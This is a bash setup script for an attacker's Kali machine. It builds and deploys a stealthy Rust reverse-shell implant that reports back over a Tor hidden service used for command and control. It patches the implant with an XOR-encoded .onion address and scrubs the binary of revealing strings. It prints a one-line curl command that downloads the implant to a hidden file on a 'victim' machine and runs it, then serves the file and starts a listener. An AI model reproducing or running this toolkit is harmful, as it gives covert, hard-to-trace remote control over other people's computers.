#!/bin/bash
# ─────────────────────────────────────────────────────────────
# Run this on KALI (attacker). It does everything automatically:
#   1. Installs dependencies
#   2. Sets up Tor hidden service
#   3. Generates TLS certs
#   4. Patches the implant with your .onion address
#   5. Builds and scrubs the binary
#   6. Creates a one-liner deploy command for the victim
#   7. Starts the listener
#
# Usage: sudo bash setup.sh
# ─────────────────────────────────────────────────────────────

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

banner() { echo -e "\n${CYAN}[*]${NC} $1"; }
ok()     { echo -e "${GREEN}[+]${NC} $1"; }
warn()   { echo -e "${YELLOW}[!]${NC} $1"; }
fail()   { echo -e "${RED}[-]${NC} $1"; exit 1; }

# ── Check root ──
[[ $EUID -ne 0 ]] && fail "Run as root: sudo bash setup.sh"

# ── Get the real user (not root) ──
REAL_USER="${SUDO_USER:-$(logname 2>/dev/null || echo $USER)}"
REAL_HOME=$(eval echo "~$REAL_USER")

# ── Step 1: Install dependencies ──
banner "Installing dependencies..."
apt update -qq 2>/dev/null
apt install -y -qq tor python3-pip rustc cargo openssl 2>/dev/null
pip install websockets -q 2>/dev/null || pip install websockets -q --break-system-packages 2>/dev/null
ok "Dependencies installed"

# ── Step 2: Setup Tor hidden service ──
banner "Setting up Tor hidden service..."
TORRC="/etc/tor/torrc"
HS_DIR="/var/lib/tor/c2_hidden"

# Remove old hidden service config if exists
sed -i '/c2_hidden/d' "$TORRC" 2>/dev/null

# Add hidden service
if ! grep -q "c2_hidden" "$TORRC" 2>/dev/null; then
    cat >> "$TORRC" << 'EOF'
HiddenServiceDir /var/lib/tor/c2_hidden/
HiddenServicePort 443 127.0.0.1:8443
EOF
fi

systemctl restart tor
sleep 5

# Wait for .onion to be generated
for i in $(seq 1 15); do
    [[ -f "$HS_DIR/hostname" ]] && break
    sleep 2
done

[[ ! -f "$HS_DIR/hostname" ]] && fail "Tor hidden service failed to start"

ONION=$(cat "$HS_DIR/hostname" | tr -d '[:space:]')
ok "Tor hidden service: ${GREEN}${ONION}${NC}"

# ── Step 3: Generate TLS certificate ──
banner "Generating TLS certificate..."
if [[ ! -f "$DIR/cert.pem" ]] || [[ ! -f "$DIR/key.pem" ]]; then
    openssl req -x509 -newkey rsa:2048 \
        -keyout "$DIR/key.pem" -out "$DIR/cert.pem" \
        -days 365 -nodes -subj '/CN=localhost' 2>/dev/null
    chown "$REAL_USER:$REAL_USER" "$DIR/key.pem" "$DIR/cert.pem"
    ok "TLS cert generated"
else
    ok "TLS cert already exists"
fi

# ── Step 4: Patch implant with .onion address ──
banner "Patching implant with .onion address..."
ONION_LEN=${#ONION}
SRC="$DIR/src/main.rs"

# Replace the ENC_DEFAULT_IP line with the .onion address
sed -i "s|^const ENC_DEFAULT_IP: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_DEFAULT_IP: [u8; ${ONION_LEN}] = xor_encode(b\"${ONION}\");|" "$SRC"

ok "Patched with ${ONION} (${ONION_LEN} bytes)"

# ── Step 5: Build the implant ──
banner "Building implant (release mode)..."
sudo -u "$REAL_USER" bash -c "
    cd '$DIR'
    export RUSTFLAGS='--remap-path-prefix=$REAL_HOME=. --remap-path-prefix=$DIR=.'
    cargo build --release 2>&1
"

BINARY="$DIR/target/release/rev_shell_wss"
STEALTH="$DIR/target/release/implant"

cp "$BINARY" "$STEALTH"

# Scrub build paths
sed -i "s|$REAL_HOME[^ ]*||g" "$STEALTH"
sed -i 's|\.cargo/registry/src/[^ ]*||g' "$STEALTH"
sed -i 's|/home/[^ ]*/build/boring-sys[^ ]*||g' "$STEALTH"

chmod +x "$STEALTH"
chown "$REAL_USER:$REAL_USER" "$STEALTH"

SIZE=$(du -h "$STEALTH" | cut -f1)
ok "Binary built: ${STEALTH} (${SIZE})"

# ── Step 6: Verify binary is clean ──
banner "Verifying binary..."
LEAKS=$(strings "$STEALTH" | grep -ciE "$ONION|192\.168|/bin/sh|reverse|shell|sudo|systemctl|torrc" || true)
if [[ "$LEAKS" -eq 0 ]]; then
    ok "Binary is clean — 0 sensitive strings"
else
    warn "Found $LEAKS potential string matches (check manually)"
fi

# ── Step 7: Get Kali IP for file transfer ──
KALI_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)(?!127)\d+\.\d+\.\d+\.\d+' | head -1)

# ── Step 8: Create deploy instructions ──
SERVE_PORT=8080

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  SETUP COMPLETE${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${YELLOW}Your .onion address:${NC} ${ONION}"
echo -e "  ${YELLOW}Scrubbed binary:${NC}    ${STEALTH}"
echo ""
echo -e "  ${CYAN}── DEPLOY TO VICTIM ──${NC}"
echo ""
echo -e "  Run this ONE command on the victim Ubuntu machine:"
echo ""
echo -e "  ${GREEN}curl http://${KALI_IP}:${SERVE_PORT}/implant -o /tmp/.d && chmod +x /tmp/.d && /tmp/.d${NC}"
echo ""
echo -e "  ${CYAN}── WHAT HAPPENS NEXT ──${NC}"
echo ""
echo -e "  1. The listener starts automatically below"
echo -e "  2. Run the one-liner on the victim"
echo -e "  3. Wait ~30-60 seconds (Tor bootstrap)"
echo -e "  4. Shell appears here"
echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
echo ""

# ── Step 9: Start file server in background for victim to download ──
banner "Starting file server on port ${SERVE_PORT} for victim download..."
cd "$DIR/target/release"
python3 -m http.server "$SERVE_PORT" --bind 0.0.0.0 &>/dev/null &
HTTP_PID=$!
ok "File server running (PID: ${HTTP_PID})"
echo -e "   ${YELLOW}Victim downloads from:${NC} http://${KALI_IP}:${SERVE_PORT}/implant"
echo ""

# Cleanup function
cleanup() {
    echo ""
    banner "Shutting down..."
    kill "$HTTP_PID" 2>/dev/null
    ok "File server stopped"
    ok "Done. Tor hidden service still running (sudo systemctl stop tor to disable)"
}
trap cleanup EXIT INT TERM

# ── Step 10: Start listener ──
banner "Starting WSS listener on port 8443..."
echo ""
cd "$DIR"
python3 listener.py 8443
